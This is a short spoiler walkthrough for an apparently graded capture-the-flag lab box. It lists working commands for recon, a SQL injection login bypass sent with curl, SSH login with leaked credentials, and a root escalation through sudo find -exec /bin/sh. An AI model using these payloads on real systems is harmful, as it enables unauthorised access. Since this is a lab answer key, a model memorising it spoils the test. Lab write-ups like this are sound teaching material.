# web-sqli - walkthrough (spoilers)

The intended path, which `task verify web-sqli` checks automatically.

## 1. Recon
The box serves a web app on port 80.

```
nmap -sV <ip>
curl http://<ip>/
```

## 2. SQL injection -> credentials
The login concatenates input into the query. Bypass auth and dump the note:

```
curl -s -X POST http://<ip>/ --data "user=' OR '1'='1' -- &pass=x"
```
The "Ops note" leaks the SSH credentials: `webadmin : Password123`.

## 3. Foothold
```
ssh webadmin@<ip>        # Password123
cat ~/user.txt
```

## 4. Privilege escalation (GTFOBins: sudo find)
```
sudo -l                  # (root) NOPASSWD: /usr/bin/find
sudo find . -maxdepth 0 -exec /bin/sh \;
cat /root/root.txt
```
